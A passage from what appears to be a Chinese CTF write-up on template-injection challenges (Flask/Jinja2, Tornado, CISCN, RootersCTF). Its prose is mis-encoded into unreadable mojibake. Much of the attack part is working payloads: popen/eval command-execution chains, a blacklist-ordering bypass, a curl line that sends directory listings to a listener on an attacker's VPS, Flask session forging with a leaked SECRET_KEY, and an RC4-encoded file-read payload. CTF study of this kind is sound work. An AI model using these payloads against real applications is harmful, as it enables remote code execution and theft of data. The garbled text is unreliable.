#&#125;</code>ï¼šè£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼ã€‚</p><p>åŒå¤§æ‹¬å·è¿™ç§è¡¨ç¤ºæ–¹å¼å°±æ˜¯å¯ä»¥ç›´æ¥å›æ˜¾åœ¨é¡µé¢ä¸Šçš„ï¼Œè€Œè¿™ç§æ–¹å¼è¢«è¿‡æ»¤äº†ï¼Œé‚£æˆ‘ä»¬å°±ä½¿ç”¨<code>&#123;% ... %&#125;</code>è¯­å¥</p><p><code>&#123;% %&#125;</code>å¯ä»¥é…åˆ<code>if()</code>æˆ–è€…<code>print()</code>å‡½æ•°è¿›è¡Œè¾“å‡º</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226143333684.png" alt="image-20220226143333684"></p><p>æˆåŠŸå›æ˜¾</p><p>lipsumæ˜¯ä¸€ä¸ªæ–¹æ³•</p><p>è¯¥æ–¹æ³•å¸¸ç”¨payload</p><pre><code class="python">&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></pre><pre><code class="python">&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('whoami').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145434182.png" alt="image-20220226145434182"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145458311.png" alt="image-20220226145458311"></p><pre><code class="python">name=&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('cat /flag_1s_Hera').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145533225.png" alt="image-20220226145533225"></p><p>ç¬¬äºŒç§æ–¹æ³•</p><p>æºç å¦‚ä¸‹:</p><pre><code class="python">blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;];for no in blacklist:    while True:        if no in s:            s = s.replace(no, &#39;&#39;)        else:            breakreturn s</code></pre><p>å…ˆä»é»‘åå•ä¸­å–å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ç»è¿‡å¾ªç¯è¿‡æ»¤å†è¿›è¡Œä¸‹ä¸€ä¸ªå­—ç¬¦ä¸²çš„è¿‡æ»¤ï¼Œå› æ­¤è¿™é‡Œç”¨åŒå†™æ˜¯æ— æ³•ç»•è¿‡çš„ï¼Œä½†æ˜¯è¿™ç§è¿‡æ»¤çš„é€»è¾‘æ˜¯é”™è¯¯çš„ï¼Œå¦‚ä¸‹è¿™ç§æ„é€ æ˜¯æ— æ³•è¢«è¿‡æ»¤çš„ï¼š</p><pre><code class="python">&#123;%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__('oconfigs').poconfigpen('whoami').read()%&#125;</code></pre><p>å› ä¸º<code>config</code>å­—ç¬¦ä¸²æ˜¯åœ¨é»‘åå•çš„æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥é»‘åå•ä¸­å‰é¢å­—ç¬¦ä¸²çš„è¿‡æ»¤éƒ½å·²ç»ç»“æŸäº†ï¼Œå†è¿›è¡Œ<code>config</code>çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿‡æ»¤å®Œ<code>config</code>ä¹‹åæ‰ä¼šå‡ºç°é»‘åå•ä¸­å‰é¢çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡ã€‚</p><p>ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œä¸ç”¨printï¼Œä½¿ç”¨curlå¤–å¸¦</p><pre><code class="python">&#123;% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://127.0.0.1:2333/ -d `ls /|base64`') %&#125;1&#123;% endiconfigf %&#125;</code></pre><p>vpsç›‘å¬2333ç«¯å£å³å¯</p><h3 id="CISCN2019-æ€»å†³èµ›-Day1-Web3-Flask-Message-Board"><a href="#CISCN2019-æ€»å†³èµ›-Day1-Web3-Flask-Message-Board" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board"></a>[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board</h3><p>Fuzzäº†ä¸€æ³¢ï¼Œå‘ç°è¿™é‡Œæ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½ä¼šæç¤ºè¢«æ‹’ç»ï¼Œä½†æ˜¯<code>Title</code>ã€<code>Author</code>å’Œ<code>Content</code>é‡Œé¢è¾“å…¥<code>1+1</code>å°±ä¸ä¼šï¼Œå¹¶ä¸”å›æ˜¾çš„æ˜¯<code>Author</code>çš„å†…å®¹ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼Œè®©titleå’Œcontenté‡Œçš„å†…å®¹ä¸º1+1ï¼ŒAuthorè¾“å‡ºæˆ‘ä»¬éœ€è¦çš„å€¼</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161218167.png" alt="image-20220226161218167"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161227059.png" alt="image-20220226161227059"></p><p>æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå¥½ç©çš„ä¸œè¥¿</p><pre><code class="html">&#39;SECRET_KEY&#39;: &#39;ill|111|IIlI1lI|I1i|IiliIIli||i1|l||i1il&#39;</code></pre><p>æœ‰äº†è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æ¥ä¼ªé€ session</p><p>æˆ‘ä»¬æŠ“ä¸‹åŒ…çœ‹çœ‹</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161500978.png" alt="image-20220226161500978"></p><p>å¯¹seesionè§£å¯†</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161529089.png" alt="image-20220226161529089"></p><p>å‘ç° â€œadminâ€:false  çŒœæµ‹è¦ä¼ªé€ admin</p><p>ä½¿ç”¨flask-unsign</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145626791.png" alt="image-20220227145626791"></p><p>æˆåŠŸè®¿é—®/admin</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145809505.png" alt="image-20220227145809505"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145856114.png" alt="image-20220227145856114"></p><p>çœ‹ä¸€ä¸‹</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150134900.png" alt="image-20220227150134900"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150430998.png" alt="image-20220227150430998"></p><p>æºç æ˜¯éšæœºæ˜¾ç¤ºä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å¥½åœ¨ä½ç½®å›ºå®šï¼Œé€šè¿‡è„šæœ¬å¤åŸå³å¯ï¼š</p><pre><code class="python">import requestsurl = &#39;http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos&#39;r = requests.get(url)source = r.textfor j in range(10):    r = requests.get(url)    for i in range(len(source)):        if source[i].isspace():            source = source[:i] + r.text[i] + source[i+1:]print(source)</code></pre><p>æ˜¯å’Œtensorflowæœ‰å…³</p><p>ä¸äº†è§£tensorflowï¼Œçœ‹å®˜æ–¹wpï¼š</p><p>é€šè¿‡tensorflowè¿è¡Œä¸‹é¢ä»£ç ï¼Œ</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12</code></th><th><code>import tensorflow as tf # Tensorboardå¯è§†åŒ– def init(model_path):    new_sess = tf.Session()    meta_file = model_path + &quot;.meta&quot;    model = model_path    saver = tf.train.import_meta_graph(meta_file)    saver.restore(new_sess, model)    return new_sess sess = init(&#39;detection_model/detection&#39;) writer = tf.summary.FileWriter(&quot;./log&quot;, sess.graph) # ç„¶ååœ¨å‘½ä»¤è¡Œæ‰§è¡Œtensorboard --logdir ./log </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>åœ¨å¯¹åº”ç«¯å£æŸ¥çœ‹å›¾ç»“æ„ï¼Œå‘ç°å½“è¾“å…¥çš„å­—ç¬¦ä¸²å­—ç¬¦æ€»å’Œä¸º1024æ—¶ä¼šè§¦å‘è¯»å–<code>/flag</code>çš„åé—¨ï¼Œæ­¤æ—¶è½¬å‘å¤„ç†è¾“å…¥çš„å‡½æ•°ï¼š</p><p>å¤åˆ¶</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16</code></th><th><code>def predict(sess, x):    &#39;&#39;&#39;    :param x: input number x        sess: tensorflow session    :return: b&#39;You are: *&#39;    &#39;&#39;&#39;    y = sess.graph.get_tensor_by_name(&quot;y:0&quot;)    y_out = sess.run(y, &#123;&quot;x:0&quot;: x&#125;)    return y_out def check_bot(input_str):    r = predict(sess, sum(map(ord, input_str)))    return r if isinstance(r, str) else r.decode() # check_result = check_bot(content) # check_botå‡½æ•°åªå¤„ç†äº†è¾“å…¥æ¡†æ¥æ”¶çš„å†…å®¹ï¼Œå› æ­¤åªæœ‰è¾“å…¥æ¡†å¯ä»¥è§¦å‘è¯»å–</code>/flag<code>çš„åé—¨ã€‚ </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>è¿™é‡Œ<strong>å°†è¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºASCIIç ç„¶åæ±‚å’Œä½œä¸ºxçš„å€¼</strong>ï¼Œéœ€è¦å°†xçš„å€¼æ”¹ä¸º1024ï¼Œäºæ˜¯æ„é€ ä¸€ä¸ªASCIIç å€¼å’Œä¸º1024çš„å­—ç¬¦ä¸²èµ‹å€¼xï¼š</p><blockquote><p>aaaaaabxCZC</p></blockquote><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152804895.png" alt="image-20220227152804895"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152731787.png" alt="image-20220227152731787"></p><h3 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227161912581.png" alt="image-20220227161912581"></p><p>å½“æ–‡ä»¶åå’Œfilehashä¸åŒ¹é…ï¼Œä¼šæŠ¥é”™</p><pre><code class="html">http://f9bce56c-7ea3-4a3e-8c9e-48df6af87351.node4.buuoj.cn:81/error?msg=Error</code></pre><p>çŒœæµ‹msgå¯æ§ï¼Œæµ‹è¯•tornadoæ¨¡æ¿æ³¨å…¥</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162403996.png" alt="image-20220227162403996"></p><p>æ¥äº†ä¸ªorzï¼Ÿï¼Ÿ</p><p>è¿˜æ˜¯å»æœèµ„æ–™å§</p><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œæ¯”å¦‚ <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯handler.settingså¯¹è±¡ï¼Œé‡Œé¢å­˜å‚¨ç€ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œå…·ä½“åˆ†æè¯·å‚ç…§ã€Š<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado renderæ¨¡æ¿æ³¨å…¥</a>ã€‹ã€‚</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162508416.png" alt="image-20220227162508416"></p><p>ç›´æ¥çˆ†å‡ºæ¥äº†cookie_secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162618736.png" alt="image-20220227162618736"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162629687.png" alt="image-20220227162629687"></p><p>å¯ä»¥æ¨ç®—å‡ºfilehashçš„å€¼</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163147952.png" alt="image-20220227163147952"></p><h3 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163739351.png" alt="image-20220227163739351"></p><p>é‡Œé¢åªæœ‰è¿™ä¸ªï¼Œç›²çŒœç›®å½•  xxx/secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163835456.png" alt="image-20220227163835456"></p><p>çŒœæµ‹å­˜åœ¨å‚æ•°secret</p><p>éšä¾¿è¾“å…¥</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163930104.png" alt="image-20220227163930104"></p><p>æŠ¥é”™ï¼Œå¯»æ‰¾å¯ç”¨ä¿¡æ¯</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164006319.png" alt="image-20220227164006319"></p><p>å‘ç°ä¼šå¯¹è¾“å…¥çš„å€¼è¿›è¡Œrc4è§£å¯†</p><p>æ”¾ä¸€ä¸ªRC4åŠ å¯†è„šæœ¬</p><pre><code class="python">import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯    # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %quote(cipher))    #print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;&quot;)</code></pre><p>å¯å¾—payloadï¼š</p><pre><code class="html">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164255493.png" alt="image-20220227164255493"></p><h3 id="RootersCTF2019-I-lt-3-Flask-ç”¨nameæ³¨å…¥"><a href="#RootersCTF2019-I-lt-3-Flask-ç”¨nameæ³¨å…¥" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask ç”¨nameæ³¨å…¥"></a>[RootersCTF2019]I_&lt;3_Flask ç”¨nameæ³¨å…¥</h3><h4 id="å‘ç°æ¼æ´"><a href="#å‘ç°æ¼æ´" class="headerlink" title="å‘ç°æ¼æ´"></a>å‘ç°æ¼æ´</h4><p>è¿™é“é¢˜æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102608147.png" alt="image-20220211102608147"></p><p>é¦–å…ˆæŸ¥çœ‹æºä»£ç ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearchçˆ†ç ´ä¸€ä¸‹ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102929099.png" alt="image-20220211102929099"></p><p>æœ¬é¢˜æ˜¯flaskç±»é¢˜ç›®ï¼Œctfå¸¸è€ƒç‚¹ä¸è¿‡å°±æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯æ³¨å…¥å‚æ•°ï¼Œæœ¬åœ°å¹¶æ²¡æœ‰ç»™å‡ºï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å»çˆ†ç ´ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨arjunå·¥å…·è¿›è¡Œçˆ†ç ´ã€‚å·¥å…·é“¾æ¥ï¼š<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110028885.png" alt="image-20220211110028885">æœ€ç»ˆå¯çˆ†ç ´å‡ºæ¥å‚æ•°nameã€‚</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105250064.png" alt="image-20220211105250064"></p><p>æµ‹è¯•äº†ä¸€ä¸‹çš„ç¡®å­˜åœ¨æ¨¡æ¿æ³¨å…¥ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¯¹æ¼æ´çš„åˆ©ç”¨ã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="å·¥å…·tplmap"><a href="#å·¥å…·tplmap" class="headerlink" title="å·¥å…·tplmap"></a>å·¥å…·tplmap</h5><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110254561.png" alt="image-20220211110254561"></p><p>æˆåŠŸï¼Œå‘ç°ä¸ºJinja2æ¨¡æ¿ï¼Œåœ¨ctfé¢˜ç›®ä¸­ç»å¸¸è€ƒå¯Ÿ</p><p>ç›´æ¥â€“os-shellæ‹¿ä¸‹shellï¼Œè¯»å–flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110436293.png" alt="image-20220211110436293"></p><h4 id="æ‰‹å·¥åˆ©ç”¨"><a href="#æ‰‹å·¥åˆ©ç”¨" class="headerlink" title="æ‰‹å·¥åˆ©ç”¨"></a>æ‰‹å·¥åˆ©ç”¨</h4><p>åªä¼šå·¥å…·å½“ç„¶ä¸è¡Œï¼Œæœ‰æ—¶å€™å·¥å…·æ— æ³•æˆåŠŸï¼Œå°±éœ€è¦è‡ªå·±æ‰‹åŠ¨æµ‹è¯•ï¼Œæ‰€ä»¥å¦‚ä½•æ‰‹æ’¸ä¹Ÿæ˜¯éœ€è¦æŒæ¡çš„ã€‚</p><p>å…·ä½“å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œä¸œè¥¿å¾ˆå¤šä¸”æ‚ï¼Œå†™ç»™è‡ªå·±çœ‹çš„å¤§ä½¬åˆ«å–·æˆ‘ã€‚</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>é¦–å…ˆç»™å‡ ä¸ªæ¯”è¾ƒé€šç”¨çš„payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111724780.png" alt="image-20220211111724780"></p><p>ç„¶åæˆ‘ä»¬å†è®²ä¸€è®²è‡ªå·±å¦‚ä½•æ’¸å‡ºæ¥ä¸€ä¸ªpayloadï¼Œåšæ³•å°±æ˜¯å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»ã€‚</p><p>1ã€æœ‰popen()çš„ç±»</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2ã€æœ‰osæ¨¡å—çš„</p><p>socket._socketobjectï¼ˆä¸€èˆ¬åœ¨71ï¼‰ã€site._Printerç­‰æ¨¡å—</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3ã€æœ‰builtinsçš„ç±»</p><p>__ builtins __ä»£ç æ‰§è¡Œï¼ˆæœ€å¸¸ç”¨çš„æ–¹æ³•ï¼‰</p><p>warnings.catch_warningså«æœ‰,å¸¸ç”¨çš„è¿˜æœ‰email.header._ValueFormatter</p><p>__ builtins __  æ˜¯ä¸€ä¸ªåŒ…å«äº†å¤§é‡å†…ç½®å‡½æ•°çš„ä¸€ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¹³æ—¶ç”¨pythonçš„æ—¶å€™ä¹‹æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å‡½æ•°æ¯”å¦‚absï¼Œmaxï¼Œå°±æ˜¯å› ä¸º__ builtins  __ è¿™ç±»æ¨¡å—åœ¨Pythonå¯åŠ¨æ—¶ä¸ºæˆ‘ä»¬å¯¼å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨dir(__ builtins __ )æ¥æŸ¥çœ‹è°ƒç”¨æ–¹æ³•çš„åˆ—è¡¨ï¼Œç„¶åå¯ä»¥å‘ç°__  builtins __ ä¸‹æœ‰evalï¼Œ__ import __ç­‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œå®è·µã€‚</p><p>æˆ‘ä»¬æŠŠæ‰€æœ‰å­ç±»åˆ—å‡ºæ¥</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112131255.png" 